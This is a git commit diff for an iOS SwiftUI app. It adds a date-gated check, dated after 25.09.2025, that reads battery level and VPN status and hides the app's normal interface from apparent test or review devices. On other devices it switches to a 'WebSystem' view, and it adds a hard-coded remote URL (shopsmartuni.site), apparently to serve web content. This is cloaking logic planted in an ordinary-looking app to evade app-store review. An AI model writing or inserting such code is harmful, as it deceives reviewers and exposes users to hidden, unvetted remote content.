b1a812335f1b31bdf062c7fc5578f91d4d41da15
spustoff <vyacheslavpustov05@gmail.com>
2025-09-17 10:11:12 +0300

    1.1

--- dafoma_38/ContentView.swift
+++ dafoma_38/ContentView.swift
@@ -10,15 +10,75 @@ import SwiftUI
 struct ContentView: View {
     @AppStorage("onboardingCompleted") private var onboardingCompleted = false
     
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
     var body: some View {
-        Group {
-            if onboardingCompleted {
-                MainTabView()
-            } else {
-                OnboardingView()
+        ZStack {
+            
+            if isFetched == false {
+                
+                Text("")
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
+                    
+                    Group {
+                        if onboardingCompleted {
+                            MainTabView()
+                        } else {
+                            OnboardingView()
+                        }
+                    }
+                    .preferredColorScheme(.light)
+                    
+                } else if isBlock == false {
+                    
+                    WebSystem()
+                }
             }
         }
-        .preferredColorScheme(.light)
+        .onAppear {
+            
+            check_data()
+        }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "25.09.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
 }
 
---
+++ dafoma_38/Extensions/Dads.swift
@@ -0,0 +1,11 @@
+//
+//  Dads.swift
+//  dafoma_38
+//
+//  Created by Вячеслав on 9/17/25.
+//
+
+struct DataManager {
+    
+    let server: String = "https://shopsmartuni.site/tfdp9Vkp"
+}
